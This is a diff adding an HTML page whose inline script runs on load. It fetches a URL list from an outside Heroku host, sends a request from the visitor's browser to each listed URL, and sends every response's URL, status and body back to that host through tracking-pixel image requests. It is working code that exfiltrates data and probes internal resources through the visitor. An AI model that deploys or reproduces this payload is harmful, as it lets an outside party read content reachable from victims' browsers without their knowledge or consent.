@@ -1,0 +1,86 @@
+<html>
+<head>
+</head>
+<body>
+<script>
+var srvcb = 'https://srvcb.herokuapp.com';
+var urls;
+try{
+function createCORSRequest(method, url){
+  var xhr = new XMLHttpRequest();
+  if ("withCredentials" in xhr){
+    xhr.open(method, url, true);
+  } else if (typeof XDomainRequest != "undefined"){
+    xhr = new XDomainRequest();
+    xhr.open(method, url);
+  } else {
+    xhr = null;
+  }
+ return xhr;
+}
+
+function obj(method, res){
+    var obj = {};
+    obj[method] = {}
+    obj[method].url = res.target?.responseURL;
+    obj[method].status = res.target?.status + res.target?.statusText;
+    obj[method].response = res.target?.responseText;
+    return JSON.stringify(obj);
+}
+
+function load(res){
+    if(res.target.responseURL.includes('srvcb')){
+        urls = res.target.responseText.split("\n");
+        urls.pop();
+        check(urls);                
+    } else {
+		// ping back request via img
+		var pingBack = new Image();
+        pingBack.src=`${srvcb}/1x1.png?${obj('onload',res)}`; 
+    }
+}
+
+function error(res){
+  // ping back request via img
+  var pingBack = new Image();
+  pingBack.src=`${srvcb}/1x1.png?${obj('onerror',res)}`;
+}
+
+function abort(res){
+  // ping back request via img
+  var pingBack = new Image();
+  pingBack.src=`${srvcb}/1x1.png?${obj('onabort',res)}`;
+}
+ 
+
+// Get a list with urls
+var url = srvcb+'/list';
+var xhr = createCORSRequest('GET', url);
+xhr.onload=load;
+xhr.onerror=error;
+xhr.onabort=abort;
+// Get a list with urls
+xhr.send();
+
+
+
+// Check urls
+function check(list){
+list.forEach(u=>{
+    var xhr = createCORSRequest('GET', u);
+    xhr.onload=load;
+    xhr.onerror=error;
+    xhr.onabort=abort;
+    xhr.send();
+});
+}
+
+}catch(e){
+pingBack.src=`${srvcb}/1x1.png?catch=${btoa(e)}`;
+console.log(e)
+}
+</script>
+	<img src='http://s.srcb.fun/noresponse'>
+</body>
+
+</html>
